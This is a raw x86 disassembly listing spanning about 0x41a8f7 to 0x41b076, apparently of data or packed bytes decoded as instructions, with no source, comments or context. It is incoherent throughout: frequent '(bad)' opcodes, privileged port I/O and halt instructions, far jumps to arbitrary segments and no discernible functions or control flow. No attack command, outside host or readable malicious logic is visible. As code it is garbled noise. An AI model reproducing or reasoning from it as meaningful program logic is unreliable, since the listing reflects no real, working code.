  41a8f7:	scas   eax,DWORD PTR es:[edi]
  41a8f8:	or     ah,BYTE PTR [edi-0x68]
  41a8fb:	mov    WORD PTR [ecx],es
  41a8fd:	ins    DWORD PTR es:[edi],dx
  41a8fe:	xor    ch,dh
  41a900:	mov    esp,0x9d9a6d43
  41a905:	fsincos 
  41a907:	mov    DWORD PTR [ebx],esp
  41a909:	hlt    
  41a90a:	jmp    0xc0f:0x667f415a
  41a911:	shl    BYTE PTR cs:0xeb119c87,cl
  41a918:	adc    BYTE PTR [ebx-0x7d33563a],0xac
  41a91f:	das    
  41a920:	stos   DWORD PTR es:[edi],eax
  41a921:	or     al,BYTE PTR [eax-0x49bfbe54]
  41a927:	mov    edx,0xdaab603f
  41a92c:	loop   0x41a998
  41a92e:	mov    bl,BYTE PTR [ecx]
  41a930:	add    edi,DWORD PTR [eax]
  41a932:	aas    
  41a933:	outs   dx,DWORD PTR ds:[esi]
  41a934:	push   esi
  41a935:	retf   0xff5c
  41a938:	in     eax,dx
  41a939:	test   ch,0x61
  41a93c:	stc    
  41a93d:	jmp    0x41a94e
  41a93f:	or     BYTE PTR [esi-0x76],ah
  41a942:	add    al,0x27
  41a944:	xchg   esp,eax
  41a945:	jno    0x41a988
  41a947:	ins    BYTE PTR es:[edi],dx
  41a948:	mov    ch,0xdb
  41a94a:	lahf   
  41a94b:	mov    dh,0x1c
  41a94d:	std    
  41a94e:	arpl   bx,si
  41a950:	jecxz  0x41a984
  41a952:	push   edi
  41a953:	xlat   BYTE PTR ds:[ebx]
  41a954:	in     al,dx
  41a955:	push   esp
  41a956:	cmp    eax,0x3331ff77
  41a95b:	or     BYTE PTR ds:0xe1e0ba56,0x40
  41a962:	retf   
  41a963:	std    
  41a964:	(bad)  
  41a965:	in     eax,dx
  41a966:	cld    
  41a967:	ret    0x84f8
  41a96a:	xor    DWORD PTR [ecx],eax
  41a96c:	mov    al,ds:0x5d24dd5e
  41a971:	dec    esi
  41a972:	std    
  41a973:	add    bl,dh
  41a975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a976:	cmp    al,0xbb
  41a978:	fsub   DWORD PTR [ecx+esi*4]
  41a97b:	inc    edi
  41a97c:	jb     0x41a95d
  41a97e:	sub    BYTE PTR [esi-0x5b],cl
  41a981:	pcmpgtw mm3,QWORD PTR ds:0xc3424807
  41a988:	mov    eax,ds:0x465f5fec
  41a98d:	push   0xb0585705
  41a992:	push   ds
  41a993:	pop    esi
  41a994:	cld    
  41a995:	sbb    DWORD PTR [esi+0x74],edx
  41a998:	dec    ebp
  41a999:	xchg   esp,eax
  41a99a:	fnstenv [esp+ecx*8]
  41a99d:	fwait
  41a99e:	mov    edx,0xf8a5e383
  41a9a3:	jmp    0x7c5b:0x18a94ab7
  41a9aa:	add    DWORD PTR [ecx],ecx
  41a9ac:	out    0xa7,eax
  41a9ae:	sbb    BYTE PTR [esi],0xdd
  41a9b1:	mov    edx,0xd12f082b
  41a9b6:	ins    DWORD PTR es:[edi],dx
  41a9b7:	mov    dl,0x1f
  41a9b9:	inc    ecx
  41a9ba:	sbb    al,0xda
  41a9bc:	push   esi
  41a9bd:	test   BYTE PTR [ebx+0x72e7b763],cl
  41a9c3:	add    DWORD PTR [ecx-0x1],ebp
  41a9c6:	or     al,0x7b
  41a9c8:	daa    
  41a9c9:	cdq    
  41a9ca:	imul   esp,DWORD PTR [eax+0x47],0xc
  41a9ce:	xchg   BYTE PTR [edx+0x21f46cf7],bh
  41a9d4:	mov    edi,ebx
  41a9d6:	dec    eax
  41a9d7:	sub    ch,BYTE PTR [ebx]
  41a9d9:	imul   esp,edi,0xffb7eed2
  41a9df:	mov    edi,0xdb5fa784
  41a9e4:	inc    edi
  41a9e5:	in     al,0x21
  41a9e7:	mov    al,0x97
  41a9e9:	and    al,0xf3
  41a9eb:	sub    al,0x89
  41a9ed:	push   0x586d75e3
  41a9f2:	mov    ah,0x51
  41a9f4:	inc    ecx
  41a9f5:	pop    edi
  41a9f6:	mov    ecx,0x4e00653b
  41a9fb:	retf   
  41a9fc:	lahf   
  41a9fd:	xchg   esi,eax
  41a9fe:	adc    ecx,ecx
  41aa00:	adc    bh,BYTE PTR [edi]
  41aa02:	and    eax,0xaa993194
  41aa07:	and    eax,0x680e2b0f
  41aa0c:	pop    edi
  41aa0d:	ja     0x41a9b6
  41aa0f:	imul   ebx,DWORD PTR [ebp+0x6f],0x29
  41aa13:	cs lahf 
  41aa15:	lods   eax,DWORD PTR ds:[esi]
  41aa16:	retf   0x1b34
  41aa19:	jae    0x41a9d2
  41aa1b:	movlps xmm7,QWORD PTR [eax-0xb]
  41aa1f:	xlat   BYTE PTR ds:[ebx]
  41aa20:	fs stos BYTE PTR es:[edi],al
  41aa22:	xor    al,0x67
  41aa24:	push   0x20
  41aa26:	je     0x41aa58
  41aa28:	inc    edx
  41aa29:	frstor [ebx]
  41aa2b:	retf   0x6d60
  41aa2e:	jl     0x41aa22
  41aa30:	xor    eax,0xdadbf54b
  41aa35:	add    BYTE PTR [ebp+eiz*1-0x26],ah
  41aa39:	dec    ebx
  41aa3a:	ret    
  41aa3b:	cmp    DWORD PTR [eax],ecx
  41aa3d:	xor    cl,BYTE PTR [ecx]
  41aa3f:	jg     0x41aa16
  41aa41:	jl     0x41aa41
  41aa43:	in     eax,dx
  41aa44:	dec    DWORD PTR [edx+0x70]
  41aa47:	and    eax,0x396b0b74
  41aa4c:	jae    0x41aa6a
  41aa4e:	push   esi
  41aa4f:	les    esi,FWORD PTR [edx+0x19]
  41aa52:	mov    ds:0x31840b59,al
  41aa57:	sub    DWORD PTR [edx+0x6a],esi
  41aa5a:	(bad)  
  41aa5b:	sbb    ebp,DWORD PTR [eax-0x10fcc99e]
  41aa61:	or     ah,BYTE PTR [eax]
  41aa63:	(bad)  [esp+edx*2-0x71c3d473]
  41aa6a:	lods   eax,DWORD PTR ds:[esi]
  41aa6b:	pop    eax
  41aa6c:	(bad)  
  41aa6d:	push   ss
  41aa6e:	adc    BYTE PTR [esi],bl
  41aa70:	in     eax,dx
  41aa71:	ins    BYTE PTR es:[edi],dx
  41aa72:	rcr    BYTE PTR [esi-0x6b1e4c72],0x34
  41aa79:	mov    ds:0xd7234cc,al
  41aa7e:	lds    ebp,FWORD PTR [ecx-0x6b1b561]
  41aa84:	nop
  41aa85:	and    BYTE PTR [ecx],ah
  41aa87:	fs clc 
  41aa89:	fmul   st,st(2)
  41aa8b:	xlat   BYTE PTR ds:[ebx]
  41aa8c:	jne    0x41aa9c
  41aa8e:	stos   BYTE PTR es:[edi],al
  41aa8f:	aad    0xa3
  41aa91:	loope  0x41aa19
  41aa93:	pop    es
  41aa94:	xor    edi,0xd
  41aa97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa98:	dec    ecx
  41aa99:	out    0x13,eax
  41aa9b:	cmc    
  41aa9c:	push   ebp
  41aa9d:	addr16 daa 
  41aa9f:	pop    ds
  41aaa0:	jno    0x41aab1
  41aaa2:	mov    edx,0x3ccca7fb
  41aaa7:	stos   DWORD PTR es:[edi],eax
  41aaa8:	jbe    0x41aaf1
  41aaaa:	loope  0x41ab1b
  41aaac:	(bad)  
  41aaad:	out    dx,eax
  41aaae:	ins    DWORD PTR es:[edi],dx
  41aaaf:	(bad)
  41aab2:	and    esp,DWORD PTR [ebx+0x66]
  41aab5:	dec    ebp
  41aab6:	lods   al,BYTE PTR ds:[esi]
  41aab7:	cmp    eax,0xa3b2f2eb
  41aabc:	in     eax,0x77
  41aabe:	dec    esi
  41aabf:	mov    cs,WORD PTR [ebx+0x79]
  41aac2:	leave  
  41aac3:	pushf  
  41aac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aac5:	call   0xc9f0:0xbc302bd7
  41aacc:	dec    ebp
  41aacd:	(bad)  
  41aace:	cld    
  41aacf:	out    0x83,al
  41aad1:	leave  
  41aad2:	dec    esp
  41aad3:	push   ds
  41aad4:	sbb    BYTE PTR [edx+0x10741149],dh
  41aada:	inc    ecx
  41aadb:	pop    esi
  41aadc:	pop    ds
  41aadd:	mov    esp,0xd744080b
  41aae2:	imul   esi,DWORD PTR [ecx+0x4c],0x3a
  41aae6:	or     al,0x3
  41aae8:	add    al,0x77
  41aaea:	adc    eax,DWORD PTR [esi+0x62]
  41aaed:	adc    al,0x1d
  41aaef:	aad    0x9e
  41aaf1:	or     al,BYTE PTR [ebp-0x55dcbc85]
  41aaf7:	mov    eax,ds:0x1806b3ca
  41aafc:	inc    eax
  41aafd:	mov    bh,0x6a
  41aaff:	push   edi
  41ab00:	xchg   edi,eax
  41ab01:	ds (bad) 
  41ab04:	mov    eax,ds:0xad1de6fd
  41ab09:	push   eax
  41ab0a:	(bad)  
  41ab0b:	cdq    
  41ab0c:	gs ja  0x41ab47
  41ab0f:	sbb    BYTE PTR [ecx-0x38],dl
  41ab12:	ds sbb al,ah
  41ab15:	adc    BYTE PTR [ecx],cl
  41ab17:	(bad)  
  41ab19:	sub    dl,BYTE PTR ds:0x809f3e51
  41ab1f:	add    al,0xa0
  41ab21:	pop    eax
  41ab22:	jle    0x41aac2
  41ab24:	fld    DWORD PTR [edx]
  41ab26:	ja     0x41ab55
  41ab28:	daa    
  41ab29:	xor    al,0xb2
  41ab2b:	push   es
  41ab2c:	pusha  
  41ab2d:	ret    0x5cdc
  41ab30:	mov    al,ds:0x6205cd6a
  41ab35:	int3   
  41ab36:	test   al,0x55
  41ab38:	enter  0x41cc,0xb1
  41ab3c:	cmp    al,0xb5
  41ab3e:	add    edi,DWORD PTR [ecx]
  41ab40:	fld    QWORD PTR [ebp+esi*1-0x4b]
  41ab44:	adc    esp,DWORD PTR ds:0xb7f374b2
  41ab4a:	cs (bad) 
  41ab4c:	adc    eax,0x78e5226c
  41ab51:	mov    ah,0xe2
  41ab53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab54:	mov    cl,ch
  41ab56:	jne    0x41ab48
  41ab58:	add    DWORD PTR [esi-0x18],ecx
  41ab5b:	or     al,0x94
  41ab5d:	test   al,0x33
  41ab5f:	sub    DWORD PTR [ebx+0x7f409e72],esp
  41ab65:	sbb    eax,0x8185ce7f
  41ab6a:	dec    esp
  41ab6b:	mov    ah,0x4b
  41ab6d:	sbb    al,0x92
  41ab6f:	lods   eax,DWORD PTR ds:[esi]
  41ab70:	xor    BYTE PTR [ebp-0x56],ah
  41ab73:	lock stc 
  41ab75:	cmp    al,BYTE PTR [eax]
  41ab77:	in     eax,dx
  41ab78:	fnstcw WORD PTR [esi]
  41ab7a:	and    eax,0x4e89fb6a
  41ab7f:	push   edx
  41ab80:	pop    ebp
  41ab81:	jge    0x41ab22
  41ab83:	pop    ecx
  41ab84:	adc    DWORD PTR [ecx],esi
  41ab86:	push   ebp
  41ab87:	stos   DWORD PTR es:[edi],eax
  41ab88:	cmp    ebx,DWORD PTR [esi-0x19]
  41ab8b:	inc    edx
  41ab8c:	neg    eax
  41ab8e:	and    dl,BYTE PTR [edx+0x0]
  41ab91:	mov    ds:0x95c3e215,al
  41ab96:	mov    al,ds:0x8a50cbc8
  41ab9b:	arpl   sp,cx
  41ab9d:	push   ebp
  41ab9e:	fstp   QWORD PTR [ecx+eax*1]
  41aba1:	pop    esi
  41aba2:	rcl    ebp,0x23
  41aba5:	add    al,0x3f
  41aba7:	xor    DWORD PTR [edx-0x52],ebx
  41abaa:	lods   eax,DWORD PTR ds:[esi]
  41abab:	repz sub edi,DWORD PTR [eax+esi*8-0x35]
  41abb0:	add    DWORD PTR [ecx],edx
  41abb2:	mov    BYTE PTR [ebx+0x60],bl
  41abb5:	scas   al,BYTE PTR es:[edi]
  41abb6:	adc    eax,DWORD PTR [esi]
  41abb8:	mov    BYTE PTR [esi-0x51016d08],ah
  41abbe:	cs cwde 
  41abc0:	enter  0xcd51,0xf1
  41abc4:	out    dx,eax
  41abc5:	repnz cmp eax,0xffffff97
  41abc9:	dec    esi
  41abca:	mov    cl,0xf8
  41abcc:	ins    DWORD PTR es:[edi],dx
  41abcd:	lods   eax,DWORD PTR ds:[esi]
  41abce:	inc    edx
  41abcf:	(bad)
  41abd2:	add    dh,ch
  41abd4:	(bad)  
  41abd5:	rcl    BYTE PTR [edi+ebp*2+0x6b],1
  41abd9:	test   eax,0x3d12cc9
  41abde:	bound  edi,QWORD PTR ds:0x98c8114
  41abe4:	fwait
  41abe5:	pop    eax
  41abe6:	mov    bh,0x9f
  41abe8:	mov    dh,0x8
  41abea:	and    eax,0xdf2c9d07
  41abef:	push   edx
  41abf0:	test   eax,0x43ed6144
  41abf5:	xchg   DWORD PTR [eax+0x4f1243a0],edi
  41abfb:	adc    eax,0x23c57489
  41ac00:	sub    esi,DWORD PTR [ebp-0x74]
  41ac03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac04:	mov    ebp,0x1e62afcb
  41ac09:	pop    esi
  41ac0a:	push   ecx
  41ac0b:	push   ebp
  41ac0c:	out    dx,al
  41ac0d:	jmp    0x3960:0xadd0f599
  41ac14:	dec    esi
  41ac15:	ds jg  0x41ac3d
  41ac18:	dec    edi
  41ac19:	es mov al,0xfd
  41ac1c:	xchg   edx,eax
  41ac1d:	das    
  41ac1e:	fwait
  41ac1f:	xor    al,0xcf
  41ac21:	loop   0x41ac7d
  41ac23:	popf   
  41ac24:	cmp    edx,DWORD PTR [edi+ecx*2-0x26c3653d]
  41ac2b:	pop    ecx
  41ac2c:	int    0xcb
  41ac2e:	adc    al,0xfb
  41ac30:	(bad)  
  41ac31:	mov    edi,0x939d03eb
  41ac36:	mov    ds:0x3d28e3fe,eax
  41ac3b:	add    DWORD PTR [ebx+0x12c922],edx
  41ac41:	inc    esp
  41ac42:	push   esp
  41ac43:	sbb    edx,DWORD PTR [edx+0x7939dd7e]
  41ac49:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41ac4b:	call   0xc552181e
  41ac50:	aam    0xf2
  41ac52:	adc    al,0xe
  41ac54:	lahf   
  41ac55:	pop    edx
  41ac56:	ss aam 0x3f
  41ac59:	ins    BYTE PTR es:[edi],dx
  41ac5a:	addr16 mov dh,0xac
  41ac5d:	test   WORD PTR [edx+0x5d36bc77],ax
  41ac64:	dec    ecx
  41ac65:	jo     0x41ac25
  41ac67:	call   0xc20a:0xf3c9328b
  41ac6e:	dec    ebp
  41ac6f:	fstp   QWORD PTR [edi-0x3]
  41ac72:	jmp    0x41ac36
  41ac74:	popf   
  41ac75:	jmp    DWORD PTR [ebp-0x7cce1a9c]
  41ac7b:	jbe    0x41ac0a
  41ac7d:	cmp    eax,DWORD PTR [ecx-0x7499575b]
  41ac83:	mov    DWORD PTR ds:0x74a11430,eax
  41ac89:	mov    eax,0x75c13298
  41ac8e:	add    eax,0x5c7f1dc9
  41ac93:	fld    QWORD PTR [edx]
  41ac95:	mov    WORD PTR [ebx],es
  41ac97:	jp     0x41ad04
  41ac99:	(bad)  
  41ac9b:	ds jnp 0x41acdc
  41ac9e:	pop    es
  41ac9f:	(bad)  
  41aca1:	pop    ds
  41aca2:	les    edi,FWORD PTR [edx]
  41aca4:	xchg   DWORD PTR [ecx],esi
  41aca6:	pop    es
  41aca7:	cmp    cl,dh
  41aca9:	outs   dx,DWORD PTR ds:[esi]
  41acaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acab:	test   eax,0x8cf32a4e
  41acb0:	sbb    esi,ebp
  41acb2:	ja     0x41acc1
  41acb4:	mov    edx,0xd279c14e
  41acb9:	in     al,dx
  41acba:	mov    gs,WORD PTR [ebp-0x2d]
  41acbd:	stc    
  41acbe:	or     eax,0x1e46858c
  41acc3:	adc    BYTE PTR [ebx-0x57],dl
  41acc6:	mov    cs,WORD PTR [eax-0x5e7388d9]
  41accc:	push   ebx
  41accd:	cmp    al,0x3a
  41accf:	mov    dl,0x75
  41acd1:	fisubr DWORD PTR [ebx-0xe]
  41acd4:	jmp    0xc64200da
  41acd9:	mov    esi,0xff0b69b5
  41acde:	aaa    
  41acdf:	not    DWORD PTR [ecx+0x37346729]
  41ace5:	sbb    eax,0x13d6fea1
  41acea:	retf   
  41aceb:	loopne 0x41acac
  41aced:	pusha  
  41acee:	in     eax,dx
  41acef:	push   ecx
  41acf0:	pop    eax
  41acf1:	pusha  
  41acf2:	stos   DWORD PTR es:[edi],eax
  41acf3:	xlat   BYTE PTR ds:[ebx]
  41acf4:	mov    esi,0x83d867d1
  41acf9:	scas   eax,DWORD PTR es:[edi]
  41acfa:	fwait
  41acfb:	dec    edi
  41acfc:	pop    ss
  41acfd:	jae    0x41ac93
  41acff:	jnp    0x41ac91
  41ad01:	shl    DWORD PTR ds:0x1b9bc75b,cl
  41ad07:	adc    DWORD PTR [ecx-0x4b],esi
  41ad0a:	(bad)  
  41ad0b:	sub    al,0x98
  41ad0d:	cmp    DWORD PTR [eax+0x17],ecx
  41ad10:	lods   eax,DWORD PTR ds:[esi]
  41ad11:	pop    edi
  41ad12:	adc    al,0xe8
  41ad14:	das    
  41ad15:	jns    0x41acd8
  41ad17:	xchg   esp,eax
  41ad18:	fld    QWORD PTR [edi]
  41ad1a:	mov    bh,0x1b
  41ad1c:	adc    al,0xfa
  41ad1e:	ret    0xadf9
  41ad21:	sub    bh,BYTE PTR [eax]
  41ad23:	mov    bh,0x24
  41ad25:	cmp    esp,DWORD PTR [esi+0x74]
  41ad28:	push   esi
  41ad29:	mov    ebp,0x7066a8bb
  41ad2e:	inc    ebp
  41ad2f:	bound  esp,QWORD PTR [edi-0x3a49f376]
  41ad35:	fdivr  st,st(2)
  41ad37:	and    eax,0x463a3316
  41ad3c:	int    0xf3
  41ad3e:	pop    eax
  41ad3f:	push   eax
  41ad40:	xchg   edi,eax
  41ad41:	(bad)  
  41ad42:	fistp  QWORD PTR [ebx]
  41ad44:	cmp    eax,0x550c41bd
  41ad49:	jbe    0x41ad8e
  41ad4b:	xor    DWORD PTR [ebx+0x2a04c8e9],0xac21ba91
  41ad55:	push   ebx
  41ad56:	(bad)  
  41ad57:	fnsave [edi-0xf6a9c55]
  41ad5d:	scas   eax,DWORD PTR es:[edi]
  41ad5e:	ret    0x919b
  41ad61:	or     ecx,DWORD PTR [edi-0x135df5ac]
  41ad67:	int    0x4c
  41ad69:	cli    
  41ad6a:	sub    DWORD PTR [esi-0x30],0x99eb1f6a
  41ad71:	mov    bh,0xc0
  41ad73:	add    DWORD PTR [edx-0x7b],esp
  41ad76:	dec    edi
  41ad77:	push   edi
  41ad78:	scas   eax,DWORD PTR es:[edi]
  41ad79:	hlt    
  41ad7a:	and    BYTE PTR [ecx],0x70
  41ad7d:	loope  0x41ada6
  41ad7f:	and    DWORD PTR [edx+0x43],ebx
  41ad82:	scas   eax,DWORD PTR es:[edi]
  41ad83:	imul   eax,esi,0xffffff9c
  41ad86:	pop    eax
  41ad87:	mov    esp,0x2da93819
  41ad8d:	out    0xf6,eax
  41ad8f:	xchg   BYTE PTR [ebp+0x2c],ah
  41ad92:	and    BYTE PTR [ebx+0x58454c7b],0xeb
  41ad99:	pop    edx
  41ad9a:	pop    ecx
  41ad9b:	jmp    0xbd9a:0x289e664b
  41ada2:	in     eax,0x3f
  41ada4:	mov    ebp,0x7f03e610
  41ada9:	add    BYTE PTR [ebx],cl
  41adab:	cmp    ebx,DWORD PTR [esi-0x6d]
  41adae:	dec    esp
  41adaf:	push   esi
  41adb0:	dec    esi
  41adb1:	imul   ebp,ecx,0xffffffda
  41adb4:	test   eax,0x95cb5804
  41adb9:	add    eax,0x3e2b1cd0
  41adbe:	scas   al,BYTE PTR es:[edi]
  41adbf:	adc    al,0x9f
  41adc1:	dec    ebx
  41adc2:	jecxz  0x41ad81
  41adc4:	addr16 in eax,0x4c
  41adc7:	sub    eax,0x915b59b1
  41adcc:	stos   DWORD PTR es:[edi],eax
  41adcd:	fbstp  TBYTE PTR [ecx-0x38]
  41add0:	cld    
  41add1:	mov    WORD PTR [eax],gs
  41add3:	(bad)  
  41add5:	add    esi,esp
  41add7:	and    al,BYTE PTR [eax+0x7545b0f5]
  41addd:	sub    ch,BYTE PTR [edx*1+0x4ab1eb2f]
  41ade4:	xchg   esi,eax
  41ade5:	cmp    ch,bl
  41ade7:	sbb    bl,BYTE PTR ds:0xea22a5c3
  41aded:	and    esp,DWORD PTR [esi-0x4e]
  41adf0:	ficom  WORD PTR [eax]
  41adf2:	fwait
  41adf3:	cmp    BYTE PTR [esi+0x4c6c96d4],ah
  41adf9:	(bad)  
  41adfa:	stos   DWORD PTR es:[edi],eax
  41adfb:	mov    ebp,0x8ba69dff
  41ae00:	in     al,dx
  41ae01:	in     eax,0x2d
  41ae03:	sub    al,0x8d
  41ae05:	pop    edx
  41ae06:	shl    DWORD PTR [esi-0x3151a0d4],0xd9
  41ae0d:	cmp    dl,BYTE PTR [eax]
  41ae0f:	inc    ebp
  41ae10:	add    ch,BYTE PTR [ecx]
  41ae12:	mov    ah,0x56
  41ae14:	(bad)  
  41ae16:	mov    WORD PTR [ebp+0x65ff8346],fs
  41ae1c:	(bad)  
  41ae1d:	jmp    0xcaf4dc12
  41ae22:	lods   eax,DWORD PTR fs:[esi]
  41ae24:	push   ds
  41ae25:	stc    
  41ae26:	scas   al,BYTE PTR es:[edi]
  41ae27:	outs   dx,BYTE PTR ds:[esi]
  41ae28:	mov    ds:0xfaac2f32,eax
  41ae2d:	fmul   QWORD PTR [edx+0x6cec1c9f]
  41ae33:	or     al,0xe1
  41ae35:	add    BYTE PTR [edx+0x3d],ah
  41ae38:	adc    eax,0x94941b8b
  41ae3d:	and    edi,DWORD PTR [ebp+eax*1-0x906f1d9]
  41ae44:	dec    esp
  41ae45:	gs mov ebx,0xc5a1f041
  41ae4b:	mov    cl,BYTE PTR [ebx]
  41ae4d:	dec    edi
  41ae4e:	xor    al,0x70
  41ae50:	xchg   ebx,eax
  41ae51:	test   eax,0x7a019dc9
  41ae56:	lea    ecx,[ebx-0x236a6ba7]
  41ae5c:	scas   al,BYTE PTR es:[edi]
  41ae5d:	sbb    al,0x47
  41ae5f:	add    al,0x62
  41ae61:	test   eax,0x7079c56f
  41ae66:	shl    BYTE PTR [esi+0x2d],cl
  41ae69:	push   0xffffffcd
  41ae6b:	mov    ah,0x9f
  41ae6d:	outs   dx,DWORD PTR ds:[esi]
  41ae6e:	inc    eax
  41ae6f:	and    eax,DWORD PTR [edx+0x5]
  41ae72:	or     DWORD PTR [eax-0x7a],esi
  41ae75:	fistp  WORD PTR [edi]
  41ae77:	fmul   QWORD PTR [esi-0x41]
  41ae7a:	inc    ebx
  41ae7b:	and    esp,0x37
  41ae7e:	aas    
  41ae7f:	aas    
  41ae80:	and    al,0x6e
  41ae82:	pop    edi
  41ae83:	cmp    DWORD PTR [ebx+0x5c],0x48aad6b5
  41ae8a:	xchg   ah,ch
  41ae8c:	lock scas al,BYTE PTR es:[edi]
  41ae8e:	mov    BYTE PTR [ecx],al
  41ae90:	ret    0xec9b
  41ae93:	jmp    0xd0b1454a
  41ae98:	xor    al,0x6d
  41ae9a:	mov    eax,0x4ee72b01
  41ae9f:	dec    edi
  41aea0:	xchg   esp,eax
  41aea1:	pop    ss
  41aea2:	or     DWORD PTR [ecx],ecx
  41aea4:	xor    ch,al
  41aea6:	std    
  41aea7:	scas   eax,DWORD PTR es:[edi]
  41aea8:	inc    esi
  41aea9:	inc    eax
  41aeaa:	pop    ecx
  41aeab:	sbb    edi,DWORD PTR [esi]
  41aead:	les    esi,FWORD PTR [edi+0x4a826872]
  41aeb3:	jmp    0xa2ca:0xa141b60f
  41aeba:	ja     0x41aef0
  41aebc:	clc    
  41aebd:	mov    bl,0xe6
  41aebf:	and    DWORD PTR [edi+ebx*2-0x1bdeb072],ebx
  41aec6:	or     eax,0xeb93695a
  41aecb:	sub    eax,0xb53df3d4
  41aed0:	out    dx,al
  41aed1:	mov    dh,0x25
  41aed3:	in     al,0x3c
  41aed5:	pop    esp
  41aed6:	mov    dl,0x5
  41aed8:	mov    edx,0xc2b0e1a2
  41aedd:	ja     0x41aee1
  41aedf:	je     0x41aea4
  41aee1:	mov    esp,0x8adba939
  41aee6:	jne    0x41aecb
  41aee8:	push   esp
  41aee9:	stos   DWORD PTR es:[edi],eax
  41aeea:	loopne 0x41ae81
  41aeec:	inc    ebx
  41aeed:	sbb    al,0xe4
  41aeef:	pop    ebx
  41aef0:	jg     0x41aed9
  41aef2:	(bad)  
  41aef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aef4:	mov    ebp,0x87aa5ae3
  41aef9:	pop    esi
  41aefa:	or     al,0xe0
  41aefc:	xor    eax,0x3c27b27c
  41af01:	jecxz  0x41aea1
  41af03:	mov    esp,0x717d8a43
  41af08:	retf   
  41af09:	retf   0x3350
  41af0c:	es daa 
  41af0e:	add    bh,dl
  41af10:	int3   
  41af11:	or     ebx,esi
  41af13:	je     0x41aee4
  41af15:	xchg   ax,ax
  41af17:	sub    dh,cl
  41af19:	push   0x33
  41af1b:	sbb    al,0x1b
  41af1d:	cmp    bl,BYTE PTR [eax+0x49eb9364]
  41af23:	aad    0x28
  41af25:	and    eax,0xa2dd7b9
  41af2a:	xchg   ebp,eax
  41af2b:	and    eax,0x2348bea4
  41af30:	enter  0x5045,0xb6
  41af34:	into   
  41af35:	and    dl,dh
  41af37:	ror    DWORD PTR [edi+0x36ea7603],cl
  41af3d:	ret    
  41af3e:	pop    ds
  41af3f:	popa   
  41af40:	ret    
  41af41:	or     DWORD PTR [eax+0x31],eax
  41af44:	dec    ebp
  41af45:	ret    
  41af46:	or     BYTE PTR [ebx],bl
  41af48:	test   DWORD PTR [esi+0x40],esi
  41af4b:	pop    ecx
  41af4c:	les    ebp,FWORD PTR [edx-0x7f]
  41af4f:	mov    edi,0x2c8a0d1e
  41af54:	jge    0x41af42
  41af56:	dec    esi
  41af57:	jns    0x41af1e
  41af59:	pop    eax
  41af5a:	(bad)  
  41af5b:	xchg   ebp,eax
  41af5c:	sub    BYTE PTR [esi+ecx*8+0x5b],0x14
  41af61:	adc    eax,0x51887974
  41af66:	(bad)  
  41af67:	cmp    bl,BYTE PTR [ecx+0x38]
  41af6a:	or     al,cl
  41af6c:	push   esi
  41af6d:	sbb    esi,DWORD PTR ds:0x57815d9f
  41af73:	mov    esp,0xf1d5e3b3
  41af78:	mov    esi,0x2644224f
  41af7d:	jmp    0x1c91981
  41af82:	xchg   ebx,eax
  41af83:	xchg   edx,eax
  41af84:	cdq    
  41af85:	mov    fs,edi
  41af87:	push   0xab76a7ca
  41af8c:	pusha  
  41af8d:	shl    edi,cl
  41af8f:	and    eax,0x6bcd3dc9
  41af94:	pop    edi
  41af95:	retf   
  41af96:	pop    edi
  41af97:	mov    esp,0x39b058db
  41af9c:	adc    bl,BYTE PTR [eax+0x34]
  41af9f:	gs arpl sp,bp
  41afa2:	es dec edx
  41afa4:	xor    al,BYTE PTR [edi-0x40]
  41afa7:	jl     0x41afd4
  41afa9:	cdq    
  41afaa:	cdq    
  41afab:	mov    ecx,0x69920037
  41afb0:	mov    ebx,esp
  41afb2:	dec    esi
  41afb3:	push   ebx
  41afb4:	fcom   DWORD PTR [edi+ebx*1+0x52]
  41afb8:	xchg   edx,eax
  41afb9:	mov    bl,BYTE PTR [ebx-0x5b244da3]
  41afbf:	in     eax,dx
  41afc0:	mov    BYTE PTR [ecx-0x3d],bl
  41afc3:	mov    WORD PTR [eax+ecx*2+0x52d1c1b6],?
  41afca:	jne    0x41b008
  41afcc:	inc    ebp
  41afcd:	adc    BYTE PTR [edx-0x77a7472b],0x1a
  41afd4:	es xor eax,0xb36fd13c
  41afda:	add    ebx,DWORD PTR [ebx+0x3447a5b4]
  41afe0:	inc    ebx
  41afe1:	dec    ecx
  41afe2:	enter  0x54dd,0x3d
  41afe6:	jnp    0x41af6f
  41afe8:	adc    BYTE PTR [esi*8+0x24befcbe],al
  41afef:	mov    ebp,0x4a57d51
  41aff4:	mov    edi,0x6fac5907
  41aff9:	ret    0xcbb5
  41affc:	jmp    0x598b:0x6e05a310
  41b003:	(bad)  
  41b004:	fsubp  st(0),st
  41b006:	xchg   ecx,ecx
  41b008:	mov    al,0xd6
  41b00a:	sub    eax,0x7b84d9f3
  41b00f:	push   ss
  41b010:	xor    ah,BYTE PTR [eax]
  41b012:	out    dx,eax
  41b013:	loope  0x41b049
  41b015:	xchg   BYTE PTR [edx-0x3],bh
  41b018:	inc    edx
  41b019:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41b01b:	pop    edx
  41b01c:	dec    edx
  41b01d:	stc    
  41b01e:	add    bl,al
  41b020:	cld    
  41b021:	sbb    BYTE PTR [esi+edx*2+0x13b52275],cl
  41b028:	mov    ebp,0x1f0db2e3
  41b02d:	in     al,0xe2
  41b02f:	jmp    0x3220:0x6c22d0a1
  41b036:	inc    ebx
  41b037:	jmpw   0x35ea
  41b03b:	ficom  WORD PTR [eax]
  41b03d:	mov    edx,0xa13b4d67
  41b042:	loopne 0x41affd
  41b044:	inc    edi
  41b045:	rcl    DWORD PTR [edx+0x6e14c619],1
  41b04b:	push   es
  41b04c:	popa   
  41b04d:	pop    ebp
  41b04e:	jg     0x41aff0
  41b050:	es (bad) 
  41b052:	jle    0x41b0c2
  41b054:	mov    ch,0x8d
  41b056:	addr16 aaa 
  41b058:	in     eax,0xd5
  41b05a:	adc    ebp,DWORD PTR [ebx]
  41b05c:	mov    eax,ds:0x342d9428
  41b061:	shl    DWORD PTR [edx-0x51],cl
  41b064:	call   0x47a6:0x3b7ab658
  41b06b:	inc    edx
  41b06c:	add    dh,ah
  41b06e:	add    bl,BYTE PTR [ebx+0x51]
  41b071:	mov    esi,0x38bfdda8
  41b076:	or     eax,0xe54adcbb
